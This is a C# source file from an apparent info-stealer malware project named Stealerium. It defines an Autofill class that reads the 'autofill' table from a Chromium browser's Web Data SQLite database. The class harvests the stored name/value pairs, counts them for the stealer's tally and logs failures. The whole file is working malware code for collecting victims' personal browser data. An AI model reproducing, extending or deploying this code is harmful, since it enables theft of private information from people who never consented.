using System;
using System.Collections.Generic;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers.Chromium
{
    internal sealed class Autofill
    {
        /// <summary>
        ///     Get Autofill values from chromium based browsers
        /// </summary>
        /// <param name="sWebData"></param>
        /// <returns>List with autofill</returns>
        public static List<AutoFill> Get(string sWebData)
        {
            var acAutoFillData = new List<AutoFill>();
            try
            {
                // Read data from table
                var sSqLite = SqlReader.ReadTable(sWebData, "autofill");
                if (sSqLite == null) return acAutoFillData;

                for (var i = 0; i < sSqLite.GetRowCount(); i++)
                {
                    var aFill = new AutoFill
                    {
                        Name = Crypto.GetUtf8(sSqLite.GetValue(i, 0)),
                        Value = Crypto.GetUtf8(sSqLite.GetValue(i, 1))
                    };

                    Counter.AutoFill++;
                    acAutoFillData.Add(aFill);
                }
            }
            catch (Exception ex)
            {
                Logging.Log("Chromium >> Failed collect autofill data\n" + ex);
            }

            return acAutoFillData;
        }
    }
}